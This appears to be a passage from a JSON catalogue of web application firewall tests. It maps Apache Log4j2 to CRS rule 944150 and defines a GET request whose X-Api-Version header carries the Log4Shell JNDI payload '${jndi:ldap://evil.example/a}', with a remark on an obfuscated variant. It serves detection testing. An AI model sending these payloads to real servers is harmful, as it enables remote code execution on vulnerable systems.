      "product": "Apache Log4j2",
      "kev": true,
      "severity": "critical",
      "crs_rules": [
        "944150"
      ],
      "test": {
        "name": "JNDI lookup in a header",
        "method": "GET",
        "path": "/",
        "headers": {
          "X-Api-Version": "${jndi:ldap://evil.example/a}"
        }
      },
      "note": "CRS 944150 also matches common obfuscations such as ${${lower:j}ndi:...}.",
